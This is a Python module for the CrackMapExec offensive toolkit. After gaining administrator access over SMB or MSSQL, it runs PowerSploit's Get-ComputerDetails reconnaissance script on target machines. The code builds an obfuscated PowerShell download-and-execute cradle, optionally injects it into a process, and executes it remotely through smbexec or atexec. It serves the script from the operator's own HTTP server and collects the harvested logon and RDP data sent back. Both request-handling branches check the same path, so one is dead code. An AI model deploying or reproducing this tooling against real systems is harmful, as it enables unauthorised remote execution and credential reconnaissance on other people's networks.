from cme.helpers.powershell import *
from cme.helpers.logger import write_log, highlight
from datetime import datetime
from io import StringIO

class CMEModule:

    name = 'Get-ComputerDetails'
    description = "Enumerates sysinfo"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def  options(self, context, module_options):
        '''
            Executes PowerSploit's Get-ComputerDetails.ps1 script which enumerates information such as; Explicit Credential Logons, Logon events, RDP Client Saved Servers etc.
            Module by @mishradhiraj_
        '''

        self.exec_methods = ['smbexec', 'atexec']
        self.inject = True
        if 'INJECT' in module_options:
            self.inject = bool(module_options['INJECT'])

        if self.inject: self.exec_methods = None
        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Get-ComputerDetails.ps1')
        self.ps_script2 = obfs_ps_script('powersploit/Recon/Get-ComputerDetails.ps1')

    def on_admin_login(self, context, connection):
        command = 'Get-ComputerDetails'
        launcher = gen_ps_iex_cradle(context, 'Get-ComputerDetails.ps1', command)

        if self.inject:
            launcher = gen_ps_inject(launcher, context, inject_once=True)

        connection.ps_execute(launcher, methods=self.exec_methods)

        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Get-ComputerDetails.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Get-ComputerDetails.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        response.stop_tracking_host()

        if len(data):
            buf = StringIO(data).readlines()
            for line in buf:
                line = line.replace('\r\n', '\n').strip()
                context.log.highlight(line)
